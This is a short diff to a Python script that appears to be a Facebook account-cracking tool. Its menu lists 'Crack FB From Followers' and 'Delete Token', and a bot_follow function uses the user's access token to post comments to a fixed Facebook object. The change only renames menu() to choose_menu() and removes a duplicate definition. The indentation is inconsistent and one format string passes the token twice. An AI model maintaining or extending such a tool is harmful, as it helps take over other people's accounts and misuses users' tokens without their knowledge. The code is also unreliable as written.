@@ -128,7 +128,7 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/953529338576547/comments/?message='+raka+'&access_token='+token)
 	requests.post('https://graph.facebook.com/953529338576547/comments/?message='+amanda+'&access_token='+token)
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
-	menu()
+	choose_menu()
 
 ###### MENU ######
 
@@ -150,13 +150,10 @@ def menu():
     print((m+"["+k+"3"+m+"]"+u+" Crack FB From Followers"))
     print((p+"["+k+"4"+m+"]"+m+" Delete Token"))    
     print((p+"["+m+"0"+p+"]"+m+" Logout"))
-    menu()
-	
-def menu():
 	r=input(m+"\n["+k+"-"+m+"]"+h+" Choose : ")
 	if r=="":
 		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
-		menu()
+		choose_menu()
 	elif r=="1":
 		friend()
 	elif r=="2":
@@ -176,7 +173,7 @@ def menu():
 			print((m+"["+k+"?"+m+"]"+p+" Error %s"%e))
 	else:
 		print((m+"["+k+"!"+m+"]"+p+" Wrong Input"))
-		menu()	
+		choose_menu()	
 
 ###### DEP FRIENDS ######
 
